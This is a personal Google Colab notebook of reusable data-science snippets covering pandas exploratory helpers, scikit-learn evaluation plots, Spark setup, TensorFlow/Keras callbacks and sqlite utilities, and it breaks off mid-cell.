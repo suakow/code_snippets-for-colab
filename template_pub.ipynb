{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "template_pub.ipynb",
      "provenance": [],
      "collapsed_sections": [
        "EGbiPZWGQ2FL",
        "j4hxjysf1diH",
        "2pC3du7R8d94",
        "FGUOmbyUME2U",
        "-tcJGwijSxbT",
        "0-nNMkmXS19F",
        "DXWclbOPVDc4",
        "hq4CpvrUWXnG",
        "Qlr5eIm4yMJ5",
        "NqzkVGw_gCPX",
        "m8hydPtIyXSc",
        "x4GfBTub0MO1",
        "xl0VuZm0phyd",
        "pg4xx-svozxW",
        "YmMqWuiE3CSG",
        "pK_5u1Qe5-cd",
        "x6ZnuVjb7P5u",
        "M7VXVblF8feh",
        "k_ZsB917e1nV",
        "dFy9_WWE-hBG",
        "AHQOs4kP-t5S",
        "d9GFbL3UPucQ",
        "7GPEfm6Ni90V",
        "hLS3jqSVmcB3",
        "CiPuDNm4S_iL",
        "6dHrzL4KNro0",
        "MvhKiC-8ONPc",
        "4_nT4cf4cjXa",
        "ab6J5xt4c-7n",
        "ckOZTkZXfkMb",
        "BZP7lb2YvdEE",
        "UpJIHX-kvy6i",
        "Tj43suTjziF_",
        "TKmtcwkF0CHp",
        "sOyjZMqZB439",
        "IA2aWDVexkOG",
        "ec1VfN6u-72I",
        "XLc1G6Lg1GmO",
        "X7ufL2Tc1ct2",
        "RJR-m75nqxDu",
        "VvsPkOx7t7y6",
        "xbVsmIvGst1O",
        "UlnOxX-_1Pss",
        "QjJbZDOF2alZ",
        "j-eyR5c24M4I",
        "dsXopXqXh9YN",
        "p4jC5K1y-JNM",
        "bIuWMv5JWbey",
        "Y4La99ceWzwv",
        "4obKnmD2pgsA",
        "c0iMl-kuq_RA",
        "DsHZ1pVc_nxX",
        "tdCJfrR3Bo3Y",
        "LujpGc9st6Eg",
        "2hY6cnA_uJnm",
        "0ge5X0kNvIFX",
        "wjTg7aOLubey",
        "nJym0SziwlTD",
        "M1Pl8SCIxpAp"
      ],
      "toc_visible": true,
      "authorship_tag": "ABX9TyPV5mRL65fuMLc+qx9Za9VI"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aU1RAT5a7cHu",
        "colab_type": "text"
      },
      "source": [
        "My Colab code snippet\n",
        "\n",
        "v. 0.0.1\n",
        "\n",
        "By Suakaw"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "aNQ_0obuiRzT",
        "colab_type": "text"
      },
      "source": [
        "Categories :\n",
        "\n",
        "*   Colab : For colab utilities\n",
        "*   Function : Useful functions\n",
        "*   Eva : For model evaluation\n",
        "*   Util : utility function\n",
        "*   Prep : For data preprocessing part\n",
        "*   Vis : For data visualisation\n",
        "*   TF : TF + Keras useful functions\n",
        "*   PT : Pytorch\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "EGbiPZWGQ2FL",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] - Markdown : Insert image from google drive"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "l_4P3ICHRE7y",
        "colab_type": "text"
      },
      "source": [
        "Place this markdown in text mode\n",
        "\n",
        "\n",
        "\n",
        "```\n",
        "![alt text](https://drive.google.com/uc?id=<file_id>)\n",
        "```\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "j4hxjysf1diH",
        "colab_type": "text"
      },
      "source": [
        "# 1[EDA] Missing Value"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xXLK9c7z1uBv",
        "colab_type": "text"
      },
      "source": [
        "Credit : https://www.kaggle.com/parulpandey/breathe-india-covid-19-effect-on-pollution"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "b6ddjot01jxl",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@title function : missing_values_table\n",
        "#@markdown To get missing value details in DF\n",
        "import pandas\n",
        "\n",
        "\n",
        "def missing_values_table(df: pandas.DataFrame):\n",
        "    # Total missing values\n",
        "    mis_val = df.isnull().sum()\n",
        "    \n",
        "    # Percentage of missing values\n",
        "    mis_val_percent = 100 * df.isnull().sum() / len(df)\n",
        "    \n",
        "    # Make a table with the results\n",
        "    mis_val_table = pd.concat([mis_val, mis_val_percent], axis=1)\n",
        "    \n",
        "    # Rename the columns\n",
        "    mis_val_table_ren_columns = mis_val_table.rename(\n",
        "    columns = {0 : 'Missing Values', 1 : '% of Total Values'})\n",
        "    \n",
        "    # Sort the table by percentage of missing descending\n",
        "    mis_val_table_ren_columns = mis_val_table_ren_columns[\n",
        "        mis_val_table_ren_columns.iloc[:,1] != 0].sort_values(\n",
        "    '% of Total Values', ascending=False).round(1)\n",
        "    \n",
        "    # Print some summary information\n",
        "    print (\"Your selected dataframe has \" + str(df.shape[1]) + \" columns.\\n\"      \n",
        "        \"There are \" + str(mis_val_table_ren_columns.shape[0]) +\n",
        "            \" columns that have missing values.\")\n",
        "    \n",
        "    # Return the dataframe with missing information\n",
        "    return mis_val_table_ren_columns"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "B9hKc-kw1mny",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "missing_values_table(df).style.background_gradient(cmap='Reds')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2pC3du7R8d94",
        "colab_type": "text"
      },
      "source": [
        "# 1[EDA] List Unique values all columns in DF"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6jvAkx0r8kMO",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title function : getAllUniqueFromDF\n",
        "#@markdown To get unique value in DataFrame\n",
        "import pandas\n",
        "\n",
        "def getAllUniqueFromDF(df: pandas.DataFrame) :\n",
        "    all_col = df.columns\n",
        "    ret = {}\n",
        "    for col in all_col :\n",
        "        print('%s : %s'%(col, str(df[col].unique())))\n",
        "        ret[col] = list(df[col].unique())\n",
        "        print('')\n",
        "\n",
        "    return ret"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vM98LWXTzWTH",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "getAllUniqueFromDF(df)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "FGUOmbyUME2U",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] Word wrap enable"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "K2cRdXJoMJ7P",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from IPython.display import HTML, display\n",
        "\n",
        "def set_css():\n",
        "    display(HTML('''\n",
        "        <style>\n",
        "        pre {\n",
        "            white-space: pre-wrap;\n",
        "        }\n",
        "        </style>\n",
        "    '''))\n",
        "\n",
        "get_ipython().events.register('pre_run_cell', set_css)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "-tcJGwijSxbT",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Autotime"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "aRfYaDYySnms",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! pip install ipython-autotime\n",
        "\n",
        "%load_ext autotime"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0-nNMkmXS19F",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn - SVG + Import"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Km03Gfh9S4FG",
        "colab_type": "code",
        "outputId": "09334b93-78fe-4005-c10e-306b6f4c5e9b",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 73
        }
      },
      "source": [
        "%config InlineBackend.figure_format = 'svg'\n",
        "\n",
        "import seaborn as sns\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "sns.set(rc={'figure.figsize':(6, 4)})"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/statsmodels/tools/_testing.py:19: FutureWarning: pandas.util.testing is deprecated. Use the functions in the public API at pandas.testing instead.\n",
            "  import pandas.util.testing as tm\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DXWclbOPVDc4",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Spark Installation"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "mQ8NF1bcVX_U",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "! apt-get install openjdk-8-jdk-headless -qq > /dev/null\n",
        "! wget -q https://downloads.apache.org/spark/spark-2.4.5/spark-2.4.5-bin-hadoop2.7.tgz\n",
        "! tar xf spark-2.4.5-bin-hadoop2.7.tgz\n",
        "! pip install -q findspark\n",
        "import os\n",
        "os.environ['JAVA_HOME'] = '/usr/lib/jvm/java-8-openjdk-amd64'\n",
        "os.environ['SPARK_HOME'] = '/content/spark-2.4.5-bin-hadoop2.7'"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MxO2jBEnVZ8h",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import findspark\n",
        "findspark.init()\n",
        "from pyspark import SparkContext\n",
        "sc = SparkContext()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hq4CpvrUWXnG",
        "colab_type": "text"
      },
      "source": [
        "# 1[Eva] Classification Report"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Fe7gwRy74vmU",
        "colab_type": "text"
      },
      "source": [
        "https://scikit-learn.org/stable/modules/generated/sklearn.metrics.classification_report.html\n",
        "\n",
        "https://scikit-learn.org/stable/modules/generated/sklearn.metrics.plot_confusion_matrix.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JJXxs4ocWsAm",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from sklearn.metrics import classification_report\n",
        "from sklearn.metrics import confusion_matrix\n",
        "import matplotlib.pyplot as plt\n",
        "import seaborn as sns\n",
        "\n",
        "print('Classification Report :')\n",
        "print(classification_report(y_test, y_pred, output_dict=False, digits=3))\n",
        "print('Confusion Matrix :')\n",
        "print(confusion_matrix(y_test, y_pred))\n",
        "sns.heatmap(confusion_matrix(y_test, y_pred), annot=True)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Qlr5eIm4yMJ5",
        "colab_type": "text"
      },
      "source": [
        "# 1[Eva] model_performance_sc_plot"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2DJpq_wYyZkD",
        "colab_type": "text"
      },
      "source": [
        "https://www.kaggle.com/dimitreoliveira/model-stacking-feature-engineering-and-eda"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "aWgLKrBnyN_q",
        "colab_type": "code",
        "cellView": "both",
        "colab": {}
      },
      "source": [
        "#@title model_performance_sc_plot\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "def model_performance_sc_plot(predictions, labels, title):\n",
        "    # Get min and max values of the predictions and labels.\n",
        "    min_val = max(max(predictions), max(labels))\n",
        "    max_val = min(min(predictions), min(labels))\n",
        "    # Create dataframe with predicitons and labels.\n",
        "    performance_df = pd.DataFrame({\"Label\":labels})\n",
        "    performance_df[\"Prediction\"] = predictions\n",
        "    # Plot data\n",
        "    sns.jointplot(y=\"Label\", x=\"Prediction\", data=performance_df, kind=\"reg\", height=7)\n",
        "    plt.plot([min_val, max_val], [min_val, max_val], 'm--')\n",
        "    plt.title(title, fontsize=9)\n",
        "    plt.show()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "l4JQtf8AyXua",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "model_performance_sc_plot(y_pred, y_true, 'Prediction')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "NqzkVGw_gCPX",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Show Image"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "DA5qijgBgEba",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from IPython.display import Image\n",
        "\n",
        "Image('file.png')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "m8hydPtIyXSc",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] (iframe) Show Youtube Video embedded"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QTwcP_w-yfEf",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from IPython.display import HTML\n",
        "\n",
        "HTML('<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/zy5qrmNrUbE\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "x4GfBTub0MO1",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] (iframe) Show Tweet embedded from Twitter"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "z9vdw0_o0PQP",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from IPython.display import HTML\n",
        "\n",
        "HTML('<blockquote class=\"twitter-tweet\"><p lang=\"und\" dir=\"ltr\">[MV Full] BNK48 - High Tension พร้อมให้รับชมแล้ววันนี้ทาง BNK48 Official YouTube : <a href=\"https://t.co/Pj67PtaU3L\">https://t.co/Pj67PtaU3L</a><a href=\"https://twitter.com/hashtag/BNK48?src=hash&amp;ref_src=twsrc%5Etfw\">#BNK48</a> <a href=\"https://twitter.com/hashtag/HighTensionTH?src=hash&amp;ref_src=twsrc%5Etfw\">#HighTensionTH</a> <a href=\"https://twitter.com/hashtag/HighTensionCompany?src=hash&amp;ref_src=twsrc%5Etfw\">#HighTensionCompany</a> <a href=\"https://t.co/YJtG97EO3g\">pic.twitter.com/YJtG97EO3g</a></p>&mdash; BNK48 #HighTensionTH (@bnk48official) <a href=\"https://twitter.com/bnk48official/status/1231562952236359681?ref_src=twsrc%5Etfw\">February 23, 2020</a></blockquote> <script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xl0VuZm0phyd",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Correlation Plot"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8-piKla14pSG",
        "colab_type": "text"
      },
      "source": [
        "https://seaborn.pydata.org/generated/seaborn.heatmap.html\n",
        "\n",
        "Parametres : x_df (target Dataframe to find correlation !)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UGUWgzGuppKd",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.heatmap(x_df.corr(), annot = True, cmap='YlOrRd',linewidths=.1)\n",
        "plt.show()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pg4xx-svozxW",
        "colab_type": "text"
      },
      "source": [
        "# 1[Colab] GPU Check"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KTIir5aMo3nV",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "gpu_info = !nvidia-smi\n",
        "gpu_info = '\\n'.join(gpu_info)\n",
        "if gpu_info.find('failed') >= 0:\n",
        "    print('Select the Runtime → \"Change runtime type\" menu to enable a GPU accelerator, ')\n",
        "    print('and then re-execute this cell.')\n",
        "else:\n",
        "    print(gpu_info)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "QKVGIGIP1vAh",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "device_name = tf.test.gpu_device_name()\n",
        "if device_name != '/device:GPU:0':\n",
        "    print('GPU Not found TT')\n",
        "else :    \n",
        "    print('Found GPU at: {}'.format(device_name))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "YmMqWuiE3CSG",
        "colab_type": "text"
      },
      "source": [
        "# 1[Eva] Plot Confusion Matrice"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Ve8gOE_n3NKV",
        "colab_type": "text"
      },
      "source": [
        "https://scikit-learn.org/stable/modules/generated/sklearn.metrics.plot_confusion_matrix.html\n",
        "\n",
        "Create Model (Estimator) before use this function !"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JGDQJRmF3Mp2",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from sklearn.metrics import plot_confusion_matrix\n",
        "\n",
        "class_names = ['Negative','Positive']\n",
        "disp = plot_confusion_matrix(model, X_test, Y_test,\n",
        "                              display_labels=class_names,\n",
        "                              cmap=plt.cm.Blues,\n",
        "                              normalize=None)\n",
        "disp.ax_.set_title(\"Confusion Matrix\")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "pK_5u1Qe5-cd",
        "colab_type": "text"
      },
      "source": [
        "# 1[Prep] Filter high correlation column of DF"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "80G7Z3jz6OYy",
        "colab_type": "text"
      },
      "source": [
        "Parametres :\n",
        "\n",
        "dataset : df to filter columns\n",
        "\n",
        "threshold : (0-1) threshold of correlation to filter out (positive and negative)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_s9Xt6Cs6NPB",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "def correlation(dataset, threshold):\n",
        "    col_corr = set() # Set of all the names of deleted columns\n",
        "    corr_matrix = dataset.corr()\n",
        "    for i in range(len(corr_matrix.columns)):\n",
        "        for j in range(i):\n",
        "            if ((corr_matrix.iloc[i, j] >= threshold)or (corr_matrix.iloc[i, j] <= -1*threshold)) and (corr_matrix.columns[j] not in col_corr) :\n",
        "                colname = corr_matrix.columns[i] # getting the name of column\n",
        "                col_corr.add(colname)\n",
        "                if colname in dataset.columns:\n",
        "                    del dataset[colname] # deleting the column from the dataset\n",
        "    return dataset"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "x6ZnuVjb7P5u",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Pandas - Set max column"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4sGm3zBU7YIr",
        "colab_type": "text"
      },
      "source": [
        "Parametres\n",
        "\n",
        "200 : number of columns"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SD7CZ3WN7Vxj",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pandas as pd\n",
        "pd.set_option('display.max_columns', 200)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "M7VXVblF8feh",
        "colab_type": "text"
      },
      "source": [
        "# 1[Eva] ROC curve plot"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LrilA3R-8tFY",
        "colab_type": "text"
      },
      "source": [
        "https://scikit-learn.org/stable/modules/generated/sklearn.metrics.roc_curve.html\n",
        "\n",
        "Parametres :\n",
        "\n",
        "X_test\n",
        "\n",
        "y_test"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5-nz-oHlY5Wz",
        "colab_type": "code",
        "cellView": "form",
        "colab": {}
      },
      "source": [
        "#@title Function : roc_plot\n",
        "\n",
        "from sklearn.metrics import roc_curve\n",
        "from sklearn.metrics import auc\n",
        "import matplotlib.pyplot as plt\n",
        "\n",
        "def roc_plot(y_test, y_prob) :\n",
        "    fpr, tpr, _ = roc_curve(y_test, y_prob[:,1])\n",
        "    roc_auc = auc(fpr,tpr)\n",
        "    plt.figure()\n",
        "    lw = 2\n",
        "    plt.plot(fpr, tpr, color='darkorange', lw=lw, label='ROC curve (AUC area = %0.2f)' % roc_auc)\n",
        "    plt.plot([0, 1], [0, 1], color='navy', lw=lw, linestyle='--')\n",
        "    plt.xlim([-0.01, 1.0])\n",
        "    plt.ylim([0.0, 1.05])\n",
        "    plt.xlabel('False Positive Rate')\n",
        "    plt.ylabel('True Positive Rate')\n",
        "    plt.title('Receiver Operating Characteristic (ROC)')\n",
        "    plt.legend(loc=\"lower right\")\n",
        "    plt.show()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lbYdg7mnZP-w",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "y_prob = model.predict_proba(X_test)\n",
        "roc_plot(y_test, y_prob) "
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "k_ZsB917e1nV",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] tqdm - Progress Bar"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "EIYVwxPPfRJE",
        "colab_type": "text"
      },
      "source": [
        "https://github.com/tqdm/tqdm"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5UHxGXBse6VK",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from tqdm.notebook import tqdm\n",
        "\n",
        "for _ in tqdm(range(10)):\n",
        "    print(_)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dFy9_WWE-hBG",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] Pickle - Save"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ayXKCB0U-l_g",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pickle\n",
        "\n",
        "pickle.dump(var, open('var.bin', 'wb'))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "AHQOs4kP-t5S",
        "colab_type": "text"
      },
      "source": [
        "#1[Util] Pickle - Load"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "It__AuiR-vmC",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pickle\n",
        "\n",
        "var = pickle.load(open('var.bin', 'rb'))"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "d9GFbL3UPucQ",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Prior Probability"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "VRdrNwELm3_X",
        "colab_type": "text"
      },
      "source": [
        "https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.crosstab.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dKEUsLrVP8sm",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pandas as pd\n",
        "\n",
        "pd.crosstab(df['class'], columns='c', normalize=True)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7GPEfm6Ni90V",
        "colab_type": "text"
      },
      "source": [
        "# 1[Prep] Train / Test Split"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "s4CcOkHljuEC",
        "colab_type": "text"
      },
      "source": [
        "https://scikit-learn.org/stable/modules/generated/sklearn.model_selection.train_test_split.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_w2DgSORjFbq",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "from sklearn.model_selection import train_test_split\n",
        "\n",
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=12345, shuffle=True,stratify=None)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hLS3jqSVmcB3",
        "colab_type": "text"
      },
      "source": [
        "# 1[Function] Count by crosstab\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hgy4BQ4Qm0Wt",
        "colab_type": "text"
      },
      "source": [
        "https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.crosstab.html"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "wwMdNZ1qmtqa",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pandas as pd\n",
        "\n",
        "pd.crosstab(df['class'], columns='c')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "CiPuDNm4S_iL",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Clear session"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "lTcmsQ6dTC5F",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow.keras.backend as K\n",
        "\n",
        "K.clear_session()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "6dHrzL4KNro0",
        "colab_type": "text"
      },
      "source": [
        "# 1[Vis] Seaborn Barchart - Counting"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5vf6JwtbN2zN",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import seaborn as sns\n",
        "\n",
        "sns.countplot(x=df['class'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "MvhKiC-8ONPc",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] History Plot"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KhYkJcizORA1",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "plt.plot(history.history['loss'], label='train')\n",
        "plt.plot(history.history['val_loss'], label='val')\n",
        "plt.legend()\n",
        "plt.title('last loss: ' + str(model.history.history['loss'][-1]))\n",
        "plt.show()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4_nT4cf4cjXa",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Reduce Learning Rate on Plateau"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "2-U-eESWdBWB",
        "colab_type": "text"
      },
      "source": [
        "https://www.tensorflow.org/api_docs/python/tf/keras/callbacks/ReduceLROnPlateau"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "TSw8UH3HcpNC",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "reduce_lr_cb = tf.keras.callbacks.ReduceLROnPlateau(monitor='val_loss', factor=0.5, patience=2, verbose=1, mode='auto', min_lr=5e-5)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ab6J5xt4c-7n",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Save Best Model"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ekv7zOBhdZV0",
        "colab_type": "text"
      },
      "source": [
        "https://www.tensorflow.org/api_docs/python/tf/keras/callbacks/ModelCheckpoint"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "4REpxXb1dAAG",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "checkpoint_cb = tf.keras.callbacks.ModelCheckpoint('model.hdf5', monitor='val_loss', verbose=1, save_best_only=True, save_weights_only=True)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "ckOZTkZXfkMb",
        "colab_type": "text"
      },
      "source": [
        "# 1[TF] Early Stoping"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "L_aiEkOWfq4K",
        "colab_type": "text"
      },
      "source": [
        "https://www.tensorflow.org/api_docs/python/tf/keras/callbacks/EarlyStopping"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WTP81wtgfm7L",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import tensorflow as tf\n",
        "\n",
        "early_stop_cb = tf.keras.callbacks.EarlyStopping(monitor = 'val_loss', patience = 2)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "BZP7lb2YvdEE",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] sqlite 3 - List Table"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "aVRYy8ZtviEo",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import sqlite3\n",
        "conn = sqlite3.connect('database.sqlite')\n",
        "\n",
        "cur = conn.cursor()\n",
        "result = cur.execute(\"SELECT name FROM sqlite_master WHERE type='table';\")\n",
        "print(result.fetchall())\n",
        "cur.close()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "UpJIHX-kvy6i",
        "colab_type": "text"
      },
      "source": [
        "# 1[Util] sqlite 3 - sqlite to Pandas Dataframe"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6zRvMZ_Dv4Nv",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
